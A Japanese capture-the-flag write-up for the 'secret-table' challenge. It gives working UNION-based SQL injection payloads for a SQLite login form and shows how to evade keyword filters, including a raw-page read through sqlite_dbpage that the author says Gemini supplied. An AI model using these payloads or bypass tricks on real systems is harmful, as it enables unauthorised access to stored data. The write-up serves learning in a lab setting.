# secret-table

## / Overview

UNIONを使ったSQLインジェクション

## / Writeup

サーバーには`users`テーブルと`secret`テーブルが用意されていて`secret`にフラグの情報が格納されている。

またWeb上には`Username`と`Password`の2つの入力欄があり、次のように評価されている。

```sql
SELECT * FROM users WHERE username='<Username>' AND password='<Password>';
```

さらに、クエリの結果として得られたテーブルの「先頭ユーザー名」が表示されることも分かっている。

このときに使えるのが`UNION`句で、これは2つのテーブルを結合して一つのテーブルとして返してくれる。注意したいのが、結合する2つのクエリ間で「カラム数」と「データ型」が一致している必要がある。

### 解法1

`users` はカラムが2つで `secret` は1つなので、`null` でカラム数を合わせる。

また、サーバー側のPythonによるチェックは secret という特定の文字列をブロックするが、SQL自体は大文字と小文字を区別しない。そのため、テーブル名を SECRET と記述することでPythonのフィルターをすり抜けつつ、データベース上では正しく `secret` を参照させることが可能になる。 (Passwordはコメントアウトされるので何でも良い)

`Username: ' UNION SELECT *, null FROM SECRET;--`
`Password: a`

```sql
SELECT * FROM users WHERE username='' UNION SELECT *, null FROM SECRET;--' AND password='a';
```

### 解法2
もし、WAFがより強力で「大文字小文字に関わらず secret という単語を一切受け付けない」場合。

自力では解けなかったのでGeminiに頼ることにした。そうすると以下のSQL文が有効であることが分かった。

`Username: ' UNION SELECT quote(data), null FROM sqlite_dbpage WHERE pgno = (SELECT rootpage FROM sqlite_master WHERE tbl_name LIKE 's%');--`

```sql
SELECT * FROM users WHERE username='' UNION SELECT quote(data), null FROM sqlite_dbpage WHERE pgno = (SELECT rootpage FROM sqlite_master WHERE tbl_name LIKE 's%');--' AND password='a';
```

解説もGeminiにして頂いた。

> まず、データベースの全構成が記された管理簿である  `sqlite_master` を検索し、目的のテーブルのデータがディスク上のどこにあるかを示す `rootpage`（開始ページ番号） を特定します。
> 次に、データベースファイルをページ単位で直接閲覧できる仮想テーブル `sqlite_dbpage` を使い、先ほど特定した番号を `pgno`（ページ番号） に指定して、アクセス権のないテーブルのデータを強制的に読み出します。
>最後に、そのままだと画面に表示できないバイナリデータを、quote関数 を使って読み取れる形式（16進数文字列）に変換し、ブラウザ上に表示させています。

解法2を実行すると、末尾に次のような16進文字列が表示される。

```text
416C706163617B4861726465725F76657273696F6E3A2060696620227365637265742220696E2076616C75652E6C6F7765722829607D
```

後は2文字区切りでASCII変換すればOK